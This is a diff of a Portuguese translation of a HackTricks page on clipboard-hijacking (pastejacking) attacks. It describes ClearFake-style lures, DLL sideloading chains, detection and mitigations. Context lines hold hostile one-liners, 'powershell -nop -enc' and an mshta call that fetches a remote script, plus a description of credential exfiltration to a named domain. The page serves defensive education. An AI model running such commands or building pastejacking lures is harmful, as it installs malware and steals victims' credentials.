@@ -1,4 +1,4 @@
-# Ataques de Sequestro de Área de Transferência (Pastejacking)
+# Ataques de Hijacking de Clipboard (Pastejacking)
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,9 +6,9 @@
 
 ## Visão Geral
 
-O sequestro de área de transferência – também conhecido como *pastejacking* – explora o fato de que os usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página da web maliciosa (ou qualquer contexto capaz de JavaScript, como um aplicativo Electron ou Desktop) insere programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (diálogo Executar), **Win + X** (Acesso Rápido / PowerShell) ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.
+O hijacking de clipboard – também conhecido como *pastejacking* – explora o fato de que os usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página da web maliciosa (ou qualquer contexto capaz de JavaScript, como um aplicativo Electron ou Desktop) coloca programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (diálogo Executar), **Win + X** (Acesso Rápido / PowerShell) ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.
 
-Como **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo da web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware comuns, como NetSupport RAT, carregador Latrodectus ou Lumma Stealer.
+Porque **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo da web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware comuns, como NetSupport RAT, Latrodectus loader ou Lumma Stealer.
 
 ## Prova de Conceito em JavaScript
 ```html
@@ -29,7 +29,7 @@ Campanhas mais antigas usavam `document.execCommand('copy')`, enquanto as mais n
 1. O usuário visita um site com erro de digitação ou comprometido (por exemplo, `docusign.sa[.]com`)
 2. O JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente uma linha de comando PowerShell codificada em Base64 na área de transferência.
 3. Instruções em HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
-4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo mais um DLL malicioso (sideloading clássico de DLL).
+4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo mais um DLL malicioso (classic DLL sideloading).
 5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistência (por exemplo, tarefa agendada) – executando, em última instância, NetSupport RAT / Latrodectus / Lumma Stealer.
 
 ### Exemplo de Cadeia NetSupport RAT
@@ -49,7 +49,7 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. Baixa `la.txt` com **curl.exe**
 2. Executa o downloader JScript dentro do **cscript.exe**
-3. Busca um payload MSI → solta `libcef.dll` ao lado de uma aplicação assinada → sideloading de DLL → shellcode → Latrodectus.
+3. Busca um payload MSI → solta `libcef.dll` além de um aplicativo assinado → sideloading de DLL → shellcode → Latrodectus.
 
 ### Lumma Stealer via MSHTA
 ```
@@ -57,7 +57,7 @@ mshta https://iplogger.co/xxxx =+\\xxx
 ```
 A chamada **mshta** inicia um script PowerShell oculto que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` através de `extrac32` e concatenação de arquivos e, finalmente, executa um script `.a3x` que exfiltra credenciais do navegador para `sumeriavgv.digital`.
 
-## Detecção e Caça
+## Detecção & Caça
 
 As equipes azuis podem combinar telemetria de área de transferência, criação de processos e registro para identificar abusos de pastejacking:
 
@@ -68,7 +68,7 @@ As equipes azuis podem combinar telemetria de área de transferência, criação
 
 ## Mitigações
 
-1. Fortalecimento do navegador – desative o acesso de gravação na área de transferência (`dom.events.asyncClipboard.clipboardItem` etc.) ou exija gesto do usuário.
+1. Dureza do navegador – desative o acesso de gravação da área de transferência (`dom.events.asyncClipboard.clipboardItem` etc.) ou exija gesto do usuário.
 2. Conscientização de segurança – ensine os usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
 3. Modo de Linguagem Constrangida do PowerShell / Política de Execução + Controle de Aplicativos para bloquear one-liners arbitrários.
 4. Controles de rede – bloqueie solicitações de saída para domínios conhecidos de pastejacking e C2 de malware.
@@ -76,6 +76,7 @@ As equipes azuis podem combinar telemetria de área de transferência, criação
 ## Truques Relacionados
 
 * O **Discord Invite Hijacking** frequentemente abusa da mesma abordagem ClickFix após atrair usuários para um servidor malicioso:
+
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
